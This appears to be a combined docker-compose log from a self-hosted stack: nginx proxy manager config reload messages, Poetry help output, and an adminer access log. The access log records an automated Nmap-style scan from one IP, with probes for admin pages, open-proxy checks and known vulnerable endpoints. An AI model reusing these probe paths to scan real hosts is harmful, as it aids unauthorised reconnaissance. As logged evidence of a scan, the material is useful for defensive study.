+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:00 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:00 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:00 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:00 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:00 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:00 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:26 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:26 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:26 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:26 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:26 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:20:26 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:21:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:21:54 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:21:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:21:54 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:21:54 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/2.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:21:54 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf.err
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46416 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46426 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46436 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46450 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46466 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46482 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46506 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46368 [200]: GET http://www.google.com
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46368 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46374 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46374 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46380 [404]: GET /rest/applinks/1.0/manifest - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46386 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46386 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46396 [404]: GET /main.jsp - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46404 [200]: GET /JIpY
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46404 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46416 [404]: GET /CSS/Miniweb.css - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46426 [200]: GET /nmaplowercheck1720579528
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46426 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46436 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46436 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46450 [200]: GET /webui
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46450 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46466 [200]: POST /sdk
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46466 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46482 [200]: GET /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46482 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46506 [200]: GET /webui
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46506 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46380 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46396 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46416 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46510 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:26173 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46522 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46510 [200]: HEAD http://www.google.com
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46510 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:65031 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:26173 [404]: HEAD /confluence/rest/applinks/1.0/manifest - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46522 [404]: HEAD /start.php - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46552 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:26173 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46522 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46558 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46572 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46578 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:65031 [200]: GET /user
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:65031 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46558 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46558 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46572 [404]: GET /Portal/Portal.mwsl - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46552 [200]: GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46552 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46578 [404]: GET /Portal0000.htm - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46592 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46572 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46578 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46596 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:28 2024] [::ffff:178.79.139.171]:46612 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46592 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46592 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46618 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46596 [404]: GET /scripts/WPnBr.dll - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46596 Closing
+[33mfastapi_app  |[0m   update             Update the dependencies as according to the pyproject.toml file.
+[33mfastapi_app  |[0m   version            Shows the version of the project or bumps it when a valid bump rule is provided.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m  cache
+[33mfastapi_app  |[0m   cache clear        Clears a Poetry cache by name.
+[33mfastapi_app  |[0m   cache list         List Poetry's caches.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m  debug
+[33mfastapi_app  |[0m   debug info         Shows debug information.
+[33mfastapi_app  |[0m   debug resolve      Debugs dependency resolution.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m  env
+[33mfastapi_app  |[0m   env info           Displays information about the current environment.
+[33mfastapi_app  |[0m   env list           Lists all virtualenvs associated with the current project.
+[33mfastapi_app  |[0m   env remove         Remove virtual environments associated with the project.
+[33mfastapi_app  |[0m   env use            Activates or creates a new virtualenv for the current project.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m  self
+[33mfastapi_app  |[0m   self add           Add additional packages to Poetry's runtime environment.
+[33mfastapi_app  |[0m   self install       Install locked packages (incl. addons) required by this Poetry installation.
+[33mfastapi_app  |[0m   self lock          Lock the Poetry installation's system requirements.
+[33mfastapi_app  |[0m   self remove        Remove additional packages from Poetry's runtime environment.
+[33mfastapi_app  |[0m   self show          Show packages from Poetry's runtime environment.
+[33mfastapi_app  |[0m   self show plugins  Shows information about the currently installed plugins.
+[33mfastapi_app  |[0m   self update        Updates Poetry to the latest version.
+[33mfastapi_app  |[0m 
+[33mfastapi_app  |[0m  source
+[33mfastapi_app  |[0m   source add         Add source configuration for project.
+[33mfastapi_app  |[0m   source remove      Remove source configured for the project.
+[33mfastapi_app  |[0m   source show        Show information about sources configured for the project.
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:21:54 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/2.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:21:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:21:54 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:21:54 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:22:05 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:22:05 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:22:05 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/2.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:22:05 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:22:05 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:22:05 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:22:05 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:23:12 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:23:12 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:23:12 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:23:12 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:23:12 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/2.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:23:12 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:23:12 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/2.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:23:12 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:23:12 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:23:12 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:55:29 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:55:29 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/2.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:55:29 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/2.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:55:29 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:55:29 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:55:29 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [9:55:29 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:03:53 PM] [SSL      ] › ℹ  info      Renewing SSL certs expiring within 30 days ...
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:03:53 PM] [SSL      ] › ℹ  info      Completed SSL cert renew process
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:04:34 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:04:34 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:04:34 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:04:34 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:04:34 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:04:34 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:04:34 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:04:34 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:04:34 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:04:34 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:13 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:13 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:13 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46618 [404]: GET /readme.txt - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46618 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46636 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46622 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46622 [404]: GET /docs/cplugError.html/ - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46636 [200]: GET /__Additional
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46636 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46622 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46642 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46642 [200]: GET /user
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46642 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46654 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46654 [404]: GET /admin.shtml - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46654 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46664 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46664 [404]: GET /favicon.ico - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46664 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46678 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46678 [200]: HEAD /
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46678 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46688 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46698 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46688 [404]: HEAD /admin.pl - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46698 [404]: HEAD /human.aspx - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46688 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46698 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46706 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46718 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46706 [404]: HEAD /inicio.php - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46718 [404]: HEAD /human.aspx - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46706 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46718 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46734 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46734 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46734 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46744 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46756 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46744 [404]: GET /admin.php - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46756 [404]: GET /dana-cached/hc/HostCheckerInstaller.osx - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46744 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46756 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46770 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46770 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46770 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46498 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46498 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46498 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46786 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46786 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46786 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46798 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46798 [404]: GET /base.jsp - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46798 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:42842 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:42842 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:42842 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46822 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46828 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46828 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 02:45:29 2024] [::ffff:178.79.139.171]:46828 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46822 [404]: GET /home.cgi - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46822 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46838 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46614 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46838 [200]: GET /Nmap/folder/check1720579528
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46838 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46614 [200]: CONNECT www.google.com:80
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46614 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46844 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46844 [200]: GET /NmapUpperCheck1720579528
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46844 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:35640 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:35640 [404]: GET /start.shtml - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:35640 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46864 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46870 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46870 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46870 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46864 [200]: GET http://www.wikipedia.org
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46864 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46884 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46894 Accepted
